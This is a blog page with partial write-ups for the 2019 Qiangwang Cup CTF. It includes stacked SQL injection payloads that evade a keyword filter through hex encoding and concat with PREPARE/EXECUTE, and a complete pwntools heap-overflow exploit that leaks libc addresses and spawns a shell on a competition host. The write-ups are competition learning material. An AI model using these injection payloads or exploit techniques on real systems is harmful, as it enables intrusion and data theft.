@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        2019强网杯部分wp - 一筐萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 你若盛开，清风自来！ </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>一筐萝卜</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#随便注"><span class="toc-text">随便注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#get到新的知识点"><span class="toc-text">get到新的知识点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#强网先锋-AP"><span class="toc-text">强网先锋-AP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#攻击流程"><span class="toc-text">攻击流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp："><span class="toc-text">exp：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#强网先锋-AD"><span class="toc-text">强网先锋_AD</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        2019强网杯部分wp
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-05-27 19:32:42</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#WP" title="WP">WP</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content no-indent">
+        <p>再见，不配强网！</p>
+<a id="more"></a>
+<h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p>之前没写出来，在<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">BUUCTF</a> 上找到了题目环境，试着再做一下</p>
+<p>打开题目后感觉像是一个注入题<br><img src="https://s2.ax1x.com/2019/06/07/V0GKne.jpg" alt><br>加一个单引号出现了报错，想的是一个报错注入，但是尝试注入时，发现过滤了许多关键字</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match("/<span class="keyword">select</span>|<span class="keyword">update</span>|<span class="keyword">delete</span>|<span class="keyword">drop</span>|<span class="keyword">insert</span>|<span class="keyword">where</span>|\./i<span class="string">",$inject);</span></span><br></pre></td></tr></table></figure>
+
+<p>当时没想到是堆叠注入，emmm，用到两个关键字</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. prepare</span><br><span class="line"></span><br><span class="line">将预定义好的sql的执行结果存到变量中，也就是存储过程</span><br><span class="line">eg：prepare radish from 'show tables'</span><br><span class="line"></span><br><span class="line">2. execute</span><br><span class="line"></span><br><span class="line">将存储过程的结果输出</span><br><span class="line">eg：execute radish</span><br></pre></td></tr></table></figure>
+
+<p>eg:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"> mysql&gt;</span><span class="bash"> <span class="built_in">set</span> @sql=<span class="string">"show tables"</span>;prepare aaa from @sql;execute aaa;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">+----------------+</span><br><span class="line">| Tables_in_test |</span><br><span class="line">+----------------+</span><br><span class="line">| admin          |</span><br><span class="line">| flag           |</span><br><span class="line">| mess           |</span><br><span class="line">| test_load_file |</span><br><span class="line">+----------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">set</span> @sql=<span class="string">"select * from admin"</span>;prepare aaa from @sql;execute aaa;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">+----+----------+--------------------------------------------------------------------------+</span><br><span class="line">| id | username | string                                                                   |</span><br><span class="line">+----+----------+--------------------------------------------------------------------------+</span><br><span class="line">|  1 | www      | asdasdsasdas                                                             |</span><br><span class="line">|  2 | aaa      | asdasdsasdas                                                             |</span><br><span class="line">|  3 | bbb      | asdasdsasdas                                                             |</span><br><span class="line">|  9 | admin    | a:2:&#123;i:0;s:32:"21232f297a57a5a743894a0e4a801fc3";i:1;s:10:"superadmin";&#125; |</span><br><span class="line">+----+----------+--------------------------------------------------------------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
+
+<p>当然在这一题中不能直接出现关键字，有两种方法可以绕过</p>
+<ol>
+<li><p>十六进制</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">"SET @ww=0x%s;PREPARE aaa from @ww;EXECUTE aaa;"</span>%(<span class="string">"sql语句"</span>.encode(<span class="string">"hex"</span>))</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>字符拼接</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sql = <span class="string">"sql语句"</span></span><br><span class="line">sql_2 = <span class="string">"SET @a = concat("</span></span><br><span class="line"><span class="keyword">for</span> <span class="keyword">x</span> in range(len(sql)):</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">x</span>==len(sql)-<span class="number">1</span>:</span><br><span class="line">		sql_2 +=<span class="string">"\'%s\'"</span>%(sql[<span class="keyword">x</span>])</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sql_2 +=<span class="string">"\'%s\',"</span>%(sql[<span class="keyword">x</span>])</span><br><span class="line">sql_2+=<span class="string">");PREPARE aaa from @a;EXECUTE aaa;"</span></span><br><span class="line"><span class="keyword">print</span> sql_2</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>开启注入：</p>
+<ul>
+<li><p>注表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> @a = <span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'h'</span>,<span class="string">'o'</span>,<span class="string">'w'</span>,<span class="string">' '</span>,<span class="string">'t'</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'l'</span>,<span class="string">'e'</span>,<span class="string">'s'</span>);<span class="keyword">PREPARE</span> aaa <span class="keyword">from</span> @a;<span class="keyword">EXECUTE</span> aaa;</span><br><span class="line"></span><br><span class="line">out：1919810931114514、words</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>注列名</p>
+</li>
+</ul>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SET <span class="meta">@a</span> = concat(<span class="string">'s'</span>,<span class="string">'h'</span>,<span class="string">'o'</span>,<span class="string">'w'</span>,<span class="string">' '</span>,<span class="string">'c'</span>,<span class="string">'o'</span>,<span class="string">'l'</span>,<span class="string">'u'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'s'</span>,<span class="string">' '</span>,<span class="string">'f'</span>,<span class="string">'r'</span>,<span class="string">'o'</span>,<span class="string">'m'</span>,<span class="string">' '</span>,<span class="string">'`'</span>,<span class="string">'1'</span>,<span class="string">'9'</span>,<span class="string">'1'</span>,<span class="string">'9'</span>,<span class="string">'8'</span>,<span class="string">'1'</span>,<span class="string">'0'</span>,<span class="string">'9'</span>,<span class="string">'3'</span>,<span class="string">'1'</span>,<span class="string">'1'</span>,<span class="string">'1'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'1'</span>,<span class="string">'4'</span>,<span class="string">'`'</span>);PREPARE aaa from <span class="meta">@a</span>;EXECUTE aaa;</span><br><span class="line"></span><br><span class="line">out：</span><br><span class="line"><span class="number">1919810931114514</span> =&gt; flag</span><br><span class="line"></span><br><span class="line">words =&gt; id、data</span><br></pre></td></tr></table></figure>
+
+<p>很显然，flag在1919810931114514表中flag列，直接获取flag即可</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> @a = <span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'e'</span>,<span class="string">'l'</span>,<span class="string">'e'</span>,<span class="string">'c'</span>,<span class="string">'t'</span>,<span class="string">' '</span>,<span class="string">'f'</span>,<span class="string">'l'</span>,<span class="string">'a'</span>,<span class="string">'g'</span>,<span class="string">' '</span>,<span class="string">'f'</span>,<span class="string">'r'</span>,<span class="string">'o'</span>,<span class="string">'m'</span>,<span class="string">' '</span>,<span class="string">'`'</span>,<span class="string">'1'</span>,<span class="string">'9'</span>,<span class="string">'1'</span>,<span class="string">'9'</span>,<span class="string">'8'</span>,<span class="string">'1'</span>,<span class="string">'0'</span>,<span class="string">'9'</span>,<span class="string">'3'</span>,<span class="string">'1'</span>,<span class="string">'1'</span>,<span class="string">'1'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'1'</span>,<span class="string">'4'</span>,<span class="string">'`'</span>);<span class="keyword">PREPARE</span> aaa <span class="keyword">from</span> @a;<span class="keyword">EXECUTE</span> aaa;</span><br></pre></td></tr></table></figure>
+
+<h4 id="get到新的知识点"><a href="#get到新的知识点" class="headerlink" title="get到新的知识点"></a>get到新的知识点</h4><ul>
+<li>反引号在sql语句的作用是为了区分MYSQL的保留字与普通字符而引入的符号</li>
+<li>PREPARE、EXECUTE的运用</li>
+</ul>
+<h3 id="强网先锋-AP"><a href="#强网先锋-AP" class="headerlink" title="强网先锋-AP"></a>强网先锋-AP</h3><p>64位elf文件，保护全开<br><img src="https://s2.ax1x.com/2019/05/27/VZfi3d.png" alt><br>拖入IDA中查看流程，有三个选项，添加一张票，查看一张票，修改指定票<br>添加票的函数申请了两个堆块，第一个堆块（v0）存name的堆块地址和puts的地址，第二个堆块存name<br><img src="https://s2.ax1x.com/2019/05/27/VZfFgA.png" alt> </p>
+<p>查看票的操作，用v0堆块存着的puts地址作为函数调用，v0中存着name的堆块地址作为参数，相当于“puts(&amp;name)”<br><img src="https://s2.ax1x.com/2019/05/27/VZfkjI.png" alt><br>修改指定票，虽然限制了票的index，但是没有限制输入name的大小，从而导致可以在堆块里溢出<br><img src="https://s2.ax1x.com/2019/05/27/VZfEut.png" alt> </p>
+<p>先进行两次添加票，动态调试出堆块的分布，发现4次malloc的地址是连续的<br><img src="https://s2.ax1x.com/2019/05/27/VZfVDP.png" alt><br>那么我们可以修改第一个票的name，长度可以覆盖到第二个票</p>
+<h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><ul>
+<li>通过堆溢出来泄露出puts的真实地址（partial overwrite，地址范围0x00~0xff，8++）</li>
+<li>计算出system、binsh的地址</li>
+<li>把第二个name覆盖成binsh的地址，第二个puts函数的地址覆盖成system的地址</li>
+<li>open第二个票，即可获取到shell<br><img src="https://s2.ax1x.com/2019/05/27/VZfZHf.png" alt> <h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#nc 117.78.37.77 31559</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">r = remote(<span class="string">"117.78.37.77"</span>,<span class="number">31559</span>)</span><br><span class="line"><span class="comment">#r = process("./task_main")</span></span><br><span class="line">file = ELF(<span class="string">"./task_main"</span>)</span><br><span class="line">puts_got = file.plt[<span class="string">'puts'</span>]</span><br><span class="line">log.info(<span class="string">"puts_got: "</span>+hex(puts_got))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length,name)</span>:</span></span><br><span class="line">	r.recvuntil(<span class="string">"The length of my owner's name:\n"</span>)</span><br><span class="line">	r.sendline(length)</span><br><span class="line">	r.recvuntil(<span class="string">"Give me my owner's name:\n"</span>)</span><br><span class="line">	r.sendline(name)</span><br><span class="line"><span class="comment"># def change()</span></span><br><span class="line">r.recvuntil(<span class="string">"Choice &gt;&gt; \n"</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">add(<span class="string">"10"</span>,<span class="string">"radish"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Choice &gt;&gt; \n"</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">add(<span class="string">"10"</span>,<span class="string">"aaaaaa"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Choice &gt;&gt; \n"</span>)</span><br><span class="line">r.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"Please tell me which tickets would you want to change it's owner's name?\n"</span>)</span><br><span class="line">r.sendline(<span class="string">"0"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"The length of my owner's name:\n"</span>)</span><br><span class="line">r.sendline(<span class="string">"34"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Give me my owner's name:\n"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">32</span>+chr(<span class="number">0x18</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">"Choice &gt;&gt; \n"</span>)</span><br><span class="line">r.sendline(<span class="string">"2"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Please tell me which tickets would you want to open?\n"</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"I'm a magic tickets.I will tell you who is my owner!\n"</span>)</span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">"\x0a"</span>,drop=<span class="literal">True</span>)+<span class="string">"\x00\x00"</span>)</span><br><span class="line">log.info(<span class="string">"puts_addr: "</span>+hex(puts_addr))</span><br><span class="line">r.recvuntil(<span class="string">"Choice &gt;&gt; \n"</span>)</span><br><span class="line">puts_sym = <span class="number">0x06f690</span></span><br><span class="line">base_addr = puts_addr-puts_sym</span><br><span class="line">log.info(<span class="string">"base_addr: "</span>+hex(base_addr))</span><br><span class="line">system_addr = <span class="number">0x045390</span>+base_addr</span><br><span class="line">binsh_str = <span class="number">0x18cd57</span>+base_addr</span><br><span class="line">log.info(<span class="string">"system_addr: "</span>+hex(system_addr))</span><br><span class="line">log.info(<span class="string">"binsh_str: "</span>+hex(binsh_str))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"3"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Please tell me which tickets would you want to change it's owner's name?\n"</span>)</span><br><span class="line">r.sendline(<span class="string">"0"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"The length of my owner's name:\n"</span>)</span><br><span class="line">r.sendline(<span class="string">"49"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Give me my owner's name:\n"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">32</span>+p64(binsh_str)+p64(system_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.sendline(<span class="string">"2"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Please tell me which tickets would you want to open?\n"</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"I'm a magic tickets.I will tell you who is my owner!\n"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="强网先锋-AD"><a href="#强网先锋-AD" class="headerlink" title="强网先锋_AD"></a>强网先锋_AD</h3><p>没什么说的，讲预设的字符串base64解密即可得到flag</p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href=“https://luobuming.github.io”>一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
